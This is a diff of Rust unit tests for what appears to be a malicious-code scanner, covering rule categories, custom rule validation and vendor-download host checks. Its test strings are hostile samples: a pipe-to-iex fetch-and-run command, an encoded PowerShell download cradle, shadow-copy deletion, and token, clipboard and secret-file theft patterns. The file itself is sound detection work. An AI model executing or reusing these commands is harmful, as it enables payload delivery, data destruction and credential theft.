+                names.contains(name),
+                "correlation keys on missing rule {:?}",
+                name
             );
         }
+        let known = [
+            "exfiltration",
+            "file_access",
+            "obfuscation",
+            "ransomware",
+            "supply_chain",
+            "network",
+            "file_write",
+            "recon",
+            "install_hook",
+        ];
+        for r in &rules {
+            assert!(
+                known.contains(&r.category.as_str()),
+                "{}: category {}",
+                r.id,
+                r.category
+            );
+        }
+    }
+
+    #[test]
+    fn test_custom_rules_are_validated() {
+        let ok = "[[rule]]\nid='X-1'\nname='Evil Host'\nseverity='high'\ncategory='exfiltration'\n\
+                  description='d'\npattern='evil\\.example'\nmatches=['https://evil.example/x']";
+        assert_eq!(parse_rules(ok).unwrap()[0].name, "Evil Host");
+        let bad_example = ok.replace("evil.example/x", "good.example/x");
+        assert!(parse_rules(&bad_example)
+            .unwrap_err()
+            .to_string()
+            .contains("does not match"));
+        let bad_regex = ok.replace("evil\\.example", "evil(");
+        assert!(parse_rules(&bad_regex).is_err());
+        let bad_severity = ok.replace("'high'", "'urgent'");
+        assert!(parse_rules(&bad_severity).is_err());
+    }
+
+    #[test]
+    fn test_vendor_download_hosts() {
+        assert!(is_vendor_download(
+            "https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe"
+        ));
+        assert!(is_vendor_download("https://download.microsoft.com/a/b.msi"));
+        assert!(!is_vendor_download(
+            "https://drive.google.com/uc?id=x&export=download.exe"
+        ));
+        assert!(!is_vendor_download(
+            "https://raw.githubusercontent.com/u/r/main/run.ps1"
+        ));
+        assert!(!is_vendor_download("http://paxfallow.ru/Lightshot.exe"));
+        assert!(!is_vendor_download("http://microsoft.com.evil.ru/a.exe"));
+        assert!(is_vendor_download(
+            "irm https://astral.sh/uv/install.ps1 | iex"
+        ));
+        assert!(!is_vendor_download("irm https://niggboo.com/aaa | iex"));
+    }
+
+    #[test]
+    fn test_public_ipv4_filter() {
         assert!(!is_public_ipv4("127.0.0.1"));
         assert!(!is_public_ipv4("192.168.1.10"));
         assert!(!is_public_ipv4("1.2.300.4"));
@@ -960,52 +699,12 @@ mod tests {
     fn test_exec_match_stays_on_its_line() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
-        let (_, _, matches) = scan_directory_filtered(dir.path(), None, None);
+        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None);
         let m = matches
             .iter()
             .find(|m| m.matched_pattern == "exec() Usage")
             .unwrap();
         assert_eq!(m.line_number, 2);
-    }
-
-    #[test]
-    fn test_discord_webhook_rule() {
-        let rules = build_rules();
-        let webhook = rules.iter().find(|r| r.name == "Discord Webhook").unwrap();
-        assert!(webhook.pattern.is_match("discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst"));
-    }
-
-    #[test]
-    fn test_telegram_rule() {
-        let rules = build_rules();
-        let tg = rules
-            .iter()
-            .find(|r| r.name == "Telegram Bot API Token")
-            .unwrap();
-        assert!(tg.pattern.is_match("https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage"));
-    }
-
-    #[test]
-    fn test_aws_key_rule() {
-        let rules = build_rules();
-        let aws = rules.iter().find(|r| r.name == "AWS Access Key").unwrap();
-        assert!(aws.pattern.is_match("AKIA1234567890123456"));
-    }
-
-    #[test]
-    fn test_github_token_rule() {
-        let rules = build_rules();
-        let gh = rules.iter().find(|r| r.name == "GitHub Token").unwrap();
-        assert!(gh
-            .pattern
-            .is_match("ghp_abcdefghijklmnopqrstuvwxyz1234567890"));
-    }
-
-    #[test]
-    fn test_eval_rule() {
-        let rules = build_rules();
-        let eval = rules.iter().find(|r| r.name == "eval() Usage").unwrap();
-        assert!(eval.pattern.is_match("eval(user_input)"));
     }
 
     #[test]
@@ -1016,150 +715,6 @@ mod tests {
         assert!(is_critical_file("package.json"));
         assert!(!is_critical_file("readme.md"));
         assert!(!is_critical_file("image.png"));
-    }
-
-    #[test]
-    fn test_subprocess_rule() {
-        let rules = build_rules();
-        let sp = rules
-            .iter()
-            .find(|r| r.name == "subprocess (Python)")
-            .unwrap();
-        assert!(sp.pattern.is_match("subprocess.Popen(['cmd.exe']"));
-        assert!(sp.pattern.is_match("subprocess.call(['ls']"));
-    }
-
-    #[test]
-    fn test_powershell_encoded() {
-        let rules = build_rules();
-        let ps = rules
-            .iter()
-            .find(|r| r.name == "PowerShell Encoded Command")
-            .unwrap();
-        assert!(ps.pattern.is_match("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="));
-    }
-
-    #[test]
-    fn test_ransomware_rule() {
-        let rules = build_rules();
-        let rw = rules
-            .iter()
-            .find(|r| r.name == "Shadow Copy Deletion")
-            .unwrap();
-        assert!(rw.pattern.is_match("vssadmin delete shadows /all /quiet"));
-    }
-
-    #[test]
-    fn test_vscode_extension_rules() {
-        let rules = build_rules();
-        let auth = rules
-            .iter()
-            .find(|r| r.name == "VS Code Session/Token Stealing")
-            .unwrap();
-        assert!(auth.pattern.is_match(
-            "const session = await vscode.authentication.getSession('github', ['repo']);"
-        ));
-
-        let clip = rules
-            .iter()
-            .find(|r| r.name == "VS Code Clipboard Harvesting")
-            .unwrap();
-        assert!(clip
-            .pattern
-            .is_match("const text = await vscode.env.clipboard.readText();"));
-
-        let fs = rules
-            .iter()
-            .find(|r| r.name == "VS Code Workspace File Reading")
-            .unwrap();
-        assert!(fs
-            .pattern
-            .is_match("const file = await vscode.workspace.fs.readFile(uri);"));
-
-        let act = rules
-            .iter()
-            .find(|r| r.name == "VS Code Wildcard Activation")
-            .unwrap();
-        assert!(act
-            .pattern
-            .is_match(r#""activationEvents": [ "*", "onCommand:myExt.start" ]"#));
-    }
-
-    #[test]
-    fn test_jetbrains_plugin_rules() {
-        let rules = build_rules();
-        let cl = rules
-            .iter()
-            .find(|r| r.name == "JetBrains Dynamic Classloading")
-            .unwrap();
-        assert!(cl
-            .pattern
-            .is_match("URLClassLoader loader = new URLClassLoader(urls);"));
-
-        let pe = rules
-            .iter()
-            .find(|r| r.name == "JetBrains Process Execution")
-            .unwrap();
-        assert!(pe.pattern.is_match("Runtime.getRuntime().exec(cmd);"));
-    }
-
-    #[test]
-    fn test_browser_extension_rules() {
-        let rules = build_rules();
-        let perm = rules
-            .iter()
-            .find(|r| r.name == "Browser Extension Dangerous Permissions")
-            .unwrap();
-        assert!(perm
-            .pattern
-            .is_match(r#""permissions": ["<all_urls>", "storage"]"#));
-
-        let eval = rules
-            .iter()
-            .find(|r| r.name == "Browser Extension Dynamic Code Execution")
-            .unwrap();
-        assert!(eval
-            .pattern
-            .is_match("chrome.tabs.executeScript(tabId, { code: payload });"));
-    }
-
-    #[test]
-    fn test_password_manager_rule_ignores_env_property() {
-        let rules = build_rules();
-        let rule = rules
-            .iter()
-            .find(|r| r.name == "Password Manager Access")
-            .unwrap();
-        assert!(!rule.pattern.is_match("const home = process.env.HOME;"));
-        assert!(!rule.pattern.is_match("vscode_2.env.appRoot"));
-        assert!(rule.pattern.is_match(r#"fs.readFileSync(home + "/.env")"#));
-    }
-
-    #[test]
-    fn test_dynamic_import_rule_ignores_set_timeout() {
-        let rules = build_rules();
-        let rule = rules
-            .iter()
-            .find(|r| r.name == "Dynamic Import/Load")
-            .unwrap();
-        assert!(!rule.pattern.is_match("setTimeout(vscode.reload, 1000)"));
-        assert!(rule.pattern.is_match("__import__('os')"));
-    }
-
-    #[test]
-    fn test_installed_extension_tampering_rule() {
-        let rules = build_rules();
-        let rule = rules
-            .iter()
-            .find(|r| r.name == "Installed Extension Tampering")
-            .unwrap();
-        // Real malicious-api-extension sample
-        assert!(rule.pattern.is_match(
-            r#"let dir = homedir + "/.vscode/extensions/ecm3401.example-api-extension-0.0.1";"#
-        ));
-        assert!(rule
-            .pattern
-            .is_match(r"let dir = home + '\.vscode\extensions\x.y-1.0.0';"));
     }
 
     #[test]
